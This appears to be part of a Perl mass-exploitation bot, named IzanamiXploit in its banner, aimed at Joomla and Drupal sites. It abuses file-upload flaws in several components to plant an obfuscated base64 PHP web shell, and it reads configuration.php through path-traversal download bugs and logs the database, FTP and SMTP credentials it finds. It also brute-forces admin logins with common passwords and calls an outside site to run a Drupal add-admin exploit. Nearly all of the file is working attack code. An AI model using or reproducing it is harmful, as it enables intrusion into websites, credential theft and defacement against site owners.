print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $foxup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$foxup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Foxcontact";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}
################ foxcontact #####################
sub fox2(){

my @filesz = ('/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
my $checkfoxupx = $ua->get("$url")->content;
if ($checkfoxupx =~ /foxcontact/) {	
	my $regex='<a name="cid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
		my $regex='<a name="mid_(.*?)">';
    if($checkfoxupx =~ s/$regex//){
}
my @files = ('components/com_foxcontact/lib/file-uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Izanami.php','index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id='.$1.'?cid='.$1.'&mid='.$1.'&qqfile=/../../Izanami.php','index.php?option=com_foxcontact&amp;view=loader&amp;type=uploader&amp;owner=module&amp;id='.$1.'&cid='.$1.'&mid='.$1.'&owner=module&id='.$1.'&qqfile=/../../Izanami.php','components/com_foxcontact/lib/uploader.php?cid='.$1.'&mid='.$1.'&qqfile=/../../Izanami.php');
OUTER: foreach my $vul(@files){
chomp $vul;
 my $Izanami = $site . $vul; 
my $indexa='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $Izanami,
        Content_Type => 'multipart/form-data',
        Content => $indexa
        );
$foxups="$site/components/com_foxcontact/Izanami.php";
}		
my $checkfoxup = $ua->get("$foxups")->content;
if ($checkfoxup =~ /Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"SHELL => $foxups\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$foxups\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Foxcontact2";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}
}
}
}
################ comadsmanager #####################
sub comadsmanager(){
my $url = "$site/index.php?option=com_adsmanager&task=upload&Resultl=component";

my $response = $ua->post( $url,
            Cookie => "", Content_Type => "form-data", Content => [file => ["files/Izanami.jpg"], name => "files/Izanami.html"]
           
            );

$comadsmanagerup="$site/Result/plupload/Izanami.html";

$checkcomadsmanagerup = $ua->get("$comadsmanagerup")->content;
if($checkcomadsmanagerup =~/HaCKeD/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  SHELL => $comadsmanagerup\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$comadsmanagerup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Ads Manager";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ b2jcontact #####################
sub b2j(){

my @filesz = ('/kontakty','contatti.html','contact-us.html','/contact','contacto','/index.php/contato.html','en/contact','contactenos');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
my $checkfoxupx = $ua->get("$url")->content;
if($checkfoxupx =~/b2j/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," ----- Exploit ==>";
print color('bold green'),"OK\n";
print color('bold red'), "Testing OK $url \n";
    print color('reset');
	my $regex='" name="cid_(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($checkfoxupx =~ s/$regex//){
    print color("bold red"), "Bid no: $1\n";
		my $bid = $1;
		my $Izanami = $site . 'index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../Izanami.php';
		    print color('reset');
my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $Izanami,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/Izanami.php")->content;
if ($checkfoxupx =~ /Izanami Xploit/) {	
print color('bold red'),"Upload Shell Succes\n";
print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/Izanami.php\n";
		    print color('reset');
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/components/com_b2jcontact/uploads/Izanami.php\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";			
}
}
}
}
}
}
sub b22j(){

my @filesz = ('/index.php/contact','/index.php/contact/adres','/kontakty','kontakty.html','contatti.html','/index.php/kontakty','/contact','contacto','/index.php/contato.html','en/contact','contactenos','contact-us');
OUTER: foreach $vulz(@filesz){
my $url = "$site/$vulz";
	print colored ("[+] SCAN URL =>",'white'),$url."\n";
my $cms = $ua->get("$url")->content;
if($cms =~/b2j/) {
    print color("bold red"), "Joomla B2jcontact Found\n";
print color('bold red'), "Testing OK $url - \n";
    print color('reset');
    my $regex='name="b2jmoduleid_(.*?)"';
    if($cms =~ s/$regex//){
    print color("bold red"), "Cid no: $1\n";
	    print color('reset');
	my $out = $1;
	my $regex='bid=(.*?)"';
    if($cms =~ s/$regex//){
	my $bid = $1;
    print color("bold red"), "Bid no: $1\n";
}	
my @filesx = ('/index.php?option=com_b2jcontact&amp;view=loader&amp;owner=component&amp;id='.$out.'&amp;bid='.$bid.'&amp;root=&type=uploader&&owner=component&id='.$out.'&qqfile=586cfc73826e4-/../Izanami.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Izanami.php','/index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid='.$bid.'&id='.$out.'&Itemid='.$out.'&qqfile=586cfc73826e4-/../Izanami.php','/index.php/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Izanami.php','/component/b2jcontact/loader/module/'.$out.'/components/b2jcontact/'.$bid.'&qqfile=586cfc73826e4-/../Izanami.php','index.php?option=com_b2jcontact&view=loader&type=uploader&owner=component&bid=1&id=138&Itemid=138&qqfile=586cfc73826e4-/../Izanami.php','/index.php/contact/loader/component/'.$out.'/components/b2jcontact/1&qqfile=586cfc73826e4-/../Izanami.php');
OUTER: foreach my $vulx(@filesx){
 my $Izanami = $site . $vulx; 
		print color('reset');		
my $index='<?php
eval(bAsE64_DecOde("ZWNobyAnaXpvY2luPGJyPicucGhwX3VuYW1lKCkuJzxmb3JtIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+Jy4nPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiPjwvZm9ybT4nOwppZiggJF9QT1NUWydfdXBsJ10gKXtpZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICdVcGxvYWQgT0snO31lbHNlIHtlY2hvICdVcGxvYWQgRmFpbCc7fX0="));
?>';
my $body = $ua->post( $Izanami,
        Content_Type => 'multipart/form-data',
        Content => $index
        );
		print color('bold red'),"waiting...\n";
		}
my $checkfoxupx = $ua->get("$site/components/com_b2jcontact/uploads/Izanami.php")->content;
if ($checkfoxupx =~ /Izanami Xploit/) {	
print color('bold red'),"Upload Shell Succes\n";
print color('bold green'),"[ShellLink] => $site/components/com_b2jcontact/uploads/Izanami.php\n";
		    print color('reset');
open (TEXT, '>>Result/Shell.txt');
print TEXT "$site/components/com_b2jcontact/uploads/Izanami.php\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"B2j Contact";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";			
}
}
}
}
}
################ comsexycontactform #####################
sub sexycontactform(){
my $url = "$site/com_sexycontactform/fileupload/index.php";
my $shell ="files/Izanami.php";
my $field_name = "files[]";

my $response = $ua->post( $url,
            Content_Type => 'multipart/form-data',
            Content => [ $field_name => ["$shell"] ]
           
            );

$sexyup="$site/com_sexycontactform/fileupload/files/Izanami.php?I=Xploit";

$checkpofxwup = $ua->get("$sexyup")->content;
if($checkpofxwup =~/Izanami Xploit/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com sexycontactform";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"File Uploaded Successfully\n";
print color('bold green'),"  SHELL => $sexyup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$sexyup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com sexycontactform";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

sub comblog(){

my $url = "$site/index.php?option=com_myblog&task=ajaxupload";
my $checkblog = $ua->get("$url")->content;
if($checkblog =~/has been uploaded/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Blog";
print color('bold white')," ----- Exploit ==>. ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Exploit It It Manual\n";
    open(save, '>>Result/Com_User.txt');   
    print save "[blog] $site\n";   
    close(save);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Blog";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"FAILED\n";
}
}


sub comusers(){

my $url = "$site/index.php?option=com_users&view=registration";
my $checkomusers = $ua->get("$url")->content;
if($checkomusers =~/jform_email2-lbl/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Users";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"Exploit It It Manual\n";
    open(save, '>>Result/Com_User.txt');   
    print save "[Com Users] $site\n";   
    close(save);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Users";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
    }
}


################ comweblinks #####################
sub comweblinks(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
$urlone ="$site/index.php?option=com_media&view=images&Resultl=component&e_name=jform_description&asset=com_weblinks&author=";
$token = $ua->get($urlone)->content;
if($token =~/<form action="(.*?)" id="uploadForm"/)
{
$url=$1;
}

my $index ="files/Izanami.gif";
my $field_name = "Filedata[]";

my $response = $ua->post( $url,
            Content_Type => 'form-data',
            Content => [ $field_name => ["$index"] ]
           
            );

$weblinksup= "$site/images/Izanami.gif";
$check = $ua->get($weblinksup)->status_line;
if ($check =~ /200/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold yellow')," [";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold green'),"Upload File Deface Succes\n";
print color('bold green'),"  URL => $weblinksup\n";
open (TEXT, '>>Result/Index-Fucked.txt');
print TEXT "$weblinksup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Com Weblinks";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

################ mod_simplefileupload #####################
sub mod_simplefileupload(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/modules/mod_simplefileuploadv1.3/elements/udd.php";
$simplefileuploadsup= "$site/modules/mod_simplefileuploadv1.3/elements/Izanami.php?I=Xploit";

my $shell ="files/Izanami.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($simplefileuploadsup)->content;
if ($check =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $simplefileuploadsup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$simplefileuploadsup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"mod_simplefileupload";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}
################ com_jwallpapers fileupload #####################
sub comjwallpapers(){
    $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);

$url ="$site/index.php?option=com_jwallpapers&task=upload";
$comjwallpapersup= "$site/jwallpapers_files/plupload/Izanami.php?I=Xploit";

my $shell ="files/Izanami.php";

my $response = $ua->post( $url, Content_Type => "multipart/form-data", Content => [ file=>["$shell"] , submit=>"Upload" ]);

$check = $ua->get($comjwallpapersup)->content;
if ($check =~ /Izanami/){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"comjwallpapers";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold green'),"Upload Shell Succes\n";
print color('bold green'),"  SHELL => $comjwallpapersup\n";
open (TEXT, '>>Result/Shell.txt');
print TEXT "$comjwallpapersup\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"comjwallpapers";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}

###### joom LFD SCAN ######
######################
########la##############
######################
sub jomlfd(){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"LFD and Config Backup";
print color('bold white')," ............. ";
print color('bold red'),"FiNDiNGG\n";
@patik=('/components/com_hdflvplayer/hdflvplayer/download.php?f=../../../configuration.php','/modules/mod_dvfoldercontent/download.php?f=Li4vLi4vY29uZmlndXJhdGlvbi5waHA=','/plugins/content/jw_allvideos/includes/download.php?file=../../../../configuration.php','/index.php?option=com_product_modul&task=download&file=../../../../../configuration.php&id=1&Itemid=1','/index.php?option=com_cckjseblod&task=download&file=configuration.php','/components/com_contushdvideoshare/hdflvplayer/download.php?f=../../../configuration.php','/index.php?option=com_community&view=groups&groupid=1&task=app&app=groupfilesharing&do=download&file=../../../../configuration.php&Itemid=0','/administrator/components/com_aceftp/quixplorer/index.php?action=download&dir=&item=configuration.php&order=name&srt=yes','/plugins/content/s5_media_player/helper.php?fileurl=Li4vLi4vLi4vY29uZmlndXJhdGlvbi5waHA=','/index.php?option=com_joomanager&controller=details&task=download&path=configuration.php','/plugins/content/wd/wddownload.php?download=wddownload.php&file=../../../configuration.php','configuration.php~','configuration.php_bak','/configuration.php-bak');
foreach $pmak(@patik){
chomp $pmak;
 
$url = "$site/$pmak";
$req = HTTP::Request->new(GET=>$url);
$userAgent = LWP::UserAgent->new();
$response = $userAgent->request($req);
$ar = $response->content;
if($ar =~ m/JConfig/g){
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"joomla LFD & Config Bugs";
print color('bold white')," .......... ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('reset');
    open(save, '>>Result/Com_User.txt');   
    print save "[jomlfd] $site\n";   
    close(save);
	        open (TEXT, '>>Result/databases.txt');
        print TEXT "$site\n[+]DATABASE INFO\n";
        close (TEXT);
        print color("white"),"\t[+]DATABASE INFO\n";
        if ($ar =~ /user = \'(.*?)\';/){
        print color("red"),"\t[-]Database User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database User = $1 \n";
        close (TEXT);
  }
        if ($ar =~ /password = \'(.*?)\';/){
        print color("red"),"\t[-]Database Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Password = $1\n";
        close (TEXT);
  }
        if ($ar =~ /db = \'(.*?)\';/){
        print color("red"),"\t[-]Database Name = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Name = $1\n";
        close (TEXT);
  }
        if ($ar =~ /host = \'(.*?)\';/){
        print color("red"),"\t[-]Database Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]Database Host = $1\n";
        close (TEXT);
  }


print color("white"),"\t[+] FTP INFO\n";
        if ($ar =~ /ftp_host = \'(.*?)\';/){
        print color("red"),"\t[-]FTP Host = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "\n[+] FTP INFO\n[-]FTP Host = $1\n";
        close (TEXT);
  }
        if ($ar =~ /ftp_port = \'(.*?)\';/){
        print color("red"),"\t[-]FTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Port = $1\n";
        close (TEXT);
  }
        if ($ar =~ /ftp_user = \'(.*?)\';/){
        print color("red"),"\t[-]FTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP User = $1\n";
        close (TEXT);
  }
        if ($ar =~ /ftp_pass = \'(.*?)\';/){
        print color("red"),"\t[-]FTP Pass = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]FTP Pass = $1\n\n";
        close (TEXT);
  }



print color("white"),"\t[+] SMTP INFO\n";
        if ($ar =~ /smtpuser = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP User = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[+] SMTP INFO\n[-]SMTP User = $1\n";
        close (TEXT);
  }
        if ($ar =~ /smtppass = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP Password = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Password = $1\n";
        close (TEXT);
  }
        if ($ar =~ /smtpport = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP Port = $1 \n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Port = $1\n";
        close (TEXT);
  }
        if ($ar =~ /smtphost = \'(.*?)\';/){
        print color("red"),"\t[-]SMTP Host = $1 \n\n";
        print color 'reset';
        open (TEXT, '>>Result/databases.txt');
        print TEXT "[-]SMTP Host = $1\n";
        close (TEXT);
  
}

}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"LFD & Config";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
}
}
}
################joomla brute#######################################3
sub joomlabrute{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Start brute force";
print color('bold white')," ----- Exploit ==>. ";
print color('bold red'),"WAiTiNG\n";
$joomsite = $site . '/administrator/index.php';

$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (30);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );


$getoken = $ua->get($joomsite)->content;
if ( $getoken =~ /name="(.*)" value="1"/ ) {
$token = $1 ;
}else{
print "[-] Can't Grabb Joomla Token !\n";
next OUTER;
}


@patsj=('123456','123456789','admin123','demo','admin123123','admin123321','12345','112233','Admin','admin123456','123','1234','admin','password','root');
foreach $pmasj(@patsj){
chomp $pmasj;
$joomuser = admin;
$joompass = $pmasj;
print "\n[-] Trying: $joompass ";
$joomlabrute = POST $joomsite, [username => $joomuser, passwd => $joompass, lang =>en-GB, option => user_login, task => login, $token => 1];
$response = $ua->request($joomlabrute);

my $check = $ua->get("$joomsite")->content;
if ($check =~ /logout/){
print "- ";
print color('bold green'),"FOUND\n";
print color('reset');

open (TEXT, '>>Result/joompassword.txt');
print TEXT "$joomsite => User: $joomuser Pass: $joompass\n";
close (TEXT);
next OUTER;
}
}
}
##########################################################
#drupal exploit coded by fallaeg gassrini xD thnx gass <3#
##########################################################
sub drupal(){
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

# check the link of the exploit or you can download script from here : https://phpx.fr/gs-bot_drupal_exploit.php and you upload it on you one shell :) 
$drupalink = "https://phpx.fr/gs-bot_drupal_exploit.php";
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="Izanami";
$pass  ="Izanami";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold green'),"OK\n";
print color('bold green')," [";
print color('bold green'),"+";
print color('bold green'),"] ";
print color('bold white'),"URL : $dr\n";
print color('bold white'),"USER : $admin\n";
print color('bold white'),"PASS : $pass\n";
open (TEXT, '>>Result/drupal.txt');
print TEXT "\nURL : $dr\n";
print TEXT "USER : $admin\n";
print TEXT "PASS : $pass\n";
close (TEXT);
}else{
print color('bold yellow'),"[";
print color('bold yellow'),"+";
print color('bold yellow'),"] ";
print color('bold white'),"Drupal Add Admin";
print color('bold yellow')," ----- Exploit ==> ";
print color('bold red'),"FAILED\n";
drb();
}
}
sub drb{
print"[-] Starting brute force";
@patsd=('123456','admin123','123','1234','admin','password','root');
foreach $pmasd(@patsd){
chomp $pmasd;
$druser = admin;
$drupass = $pmasd;
print "\n[-] Trying: $drupass ";

$drupal = $site . '/user/login';
$redirect = $site . '/user/1';

$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
$response = $ua->request($drupalbrute);
$stat = $response->status_line;
    if ($stat =~ /302/){
print "- ";
print color('bold green'),"FOUND\n";
print color('reset');

open (TEXT, '>>Result.txt');
print TEXT "$drupal => User: $druser Pass: $drupass\n";
close (TEXT);
next OUTER;

}
}
sub flag {
    print "\n[+] IzanamiXploit V 3.0 \n";
    print "[+] Coder : ./H1IRUK4\n";
    print "[+] Usage :\n";
    print "\nExample: perl bot.pl -u urllist.txt -t 15 \n\n";
    
}
}}